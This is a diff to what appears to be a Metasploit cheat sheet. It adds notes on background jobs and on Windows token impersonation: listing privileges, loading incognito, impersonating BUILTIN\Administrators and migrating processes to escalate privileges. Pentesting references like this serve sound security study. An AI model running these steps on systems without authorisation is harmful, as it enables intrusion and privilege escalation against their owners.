@@ -143,6 +143,18 @@ Just start listener
 use exploit/multi/handler
 ```
 
+## Jobs
+
+Start job in background
+```bash
+run -j
+```
+
+Show jobs 
+```bash
+jobs
+```
+
 ## Post exploitation
 
 This module suggests local meterpreter exploits that can be used.
@@ -175,6 +187,30 @@ sysinfo
 Port forwarding
 ```bash
 portfwd add -l <port> -r 127.0.0.1 -p <port>
+```
+
+#### Impersonation (Windows)
+
+Look for privileges like `SeImpersonatePrivilege`, `SeDebugPrivilege`, etc.
+```bash
+whoami /priv
+```
+
+Load incognito module and list available tokens
+```bash
+load incognito
+list_tokens -g
+```
+
+Impersonate e.g. `BUILTIN\Administrators`
+```bash
+impersonate_token "BUILTIN\Administrators"
+```
+
+Migrate to a process with the correct permission, to actually get the elevated permissions (token != permission).
+```bash
+ps 
+migrate <pid>
 ```
 
 ## Resource Scripts
